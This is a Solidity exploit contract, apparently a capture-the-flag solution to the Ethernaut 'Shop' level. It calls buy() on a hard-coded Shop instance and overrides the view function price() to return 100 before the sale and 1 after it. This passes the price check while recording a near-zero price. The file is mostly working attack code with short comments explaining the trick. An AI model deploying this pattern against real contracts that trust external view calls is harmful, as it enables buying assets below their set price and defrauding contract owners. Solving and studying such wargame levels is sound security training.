// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../contracts/Shop.sol';

contract HackShop is Buyer {
    // Complete with the instance's address
    Shop public originalContract = Shop(0x0BbDBDE0B147fbDcb5e24A7783280f427A12A11A);

    // We trigger the function buy on the Shop contract
    function hack() public {
        originalContract.buy();
    }

    // We can't change the state because it's a view function
    // But we can seize the change of state that happens in the Shop contract
    // So, we use a price to bypass the require and another price to save in the variable price
    function price() public view override returns (uint) {
        return originalContract.isSold() ? 1 : 100;
    }

}